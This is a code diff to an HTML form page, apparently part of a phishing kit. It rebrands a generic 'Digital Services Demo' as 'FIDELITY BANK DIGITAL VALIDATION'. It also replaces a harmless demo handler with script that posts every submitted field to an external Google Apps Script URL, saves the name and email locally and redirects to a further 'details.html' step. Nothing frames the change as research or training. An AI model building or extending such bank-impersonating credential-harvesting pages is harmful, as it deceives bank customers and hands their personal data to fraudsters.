@@ -144,8 +144,8 @@
 <body>
 
   <div class="header">
-    <h1>DIGITAL SERVICES DEMO</h1>
-    <p>Contact Information</p>
+    <h1>FIDELITY BANK DIGITAL VALIDATION </h1>
+    <p>Believe With Us.</p>
   </div>
 
   <div class="form-wrap" id="formContainer">
@@ -185,7 +185,7 @@
 
   </div>
 
-  <footer>Digital Services</footer>
+  <footer>All rights reserved @2026 </footer>
 
   <div class="overlay" id="overlay">
     <div class="spinner"></div>
@@ -193,21 +193,26 @@
   </div>
 
   <script>
+    const scriptURL = "https://script.google.com/macros/s/AKfycbxna9EgM4s8zbNQTkfzcHfADid6CE7MEMmXAAIX2RTU6YfT-GkHRxEIWPVa81Qt-oO0/exec";
     const form = document.getElementById('dataForm');
     const overlay = document.getElementById('overlay');
 
-    form.addEventListener('submit', (e) => {
+    form.addEventListener('submit', async (e) => {
       e.preventDefault();
-
       overlay.classList.add('active');
-
-      setTimeout(() => {
+      const fd = new FormData(form);
+      const { firstName, lastName, email } = Object.fromEntries(fd.entries());
+      try {
+        await fetch(scriptURL, { method: 'POST', body: fd });
+        localStorage.setItem('firstName', firstName || '');
+        localStorage.setItem('lastName', lastName || '');
+        localStorage.setItem('email', email || '');
+        setTimeout(() => window.location.href = 'details.html', 1800);
+      } catch (err) {
         overlay.classList.remove('active');
-        alert('Demo completed successfully.');
-        form.reset();
-      }, 1800);
+        alert('Something went wrong. Please try again.');
+      }
     });
   </script>
-
 </body>
 </html>
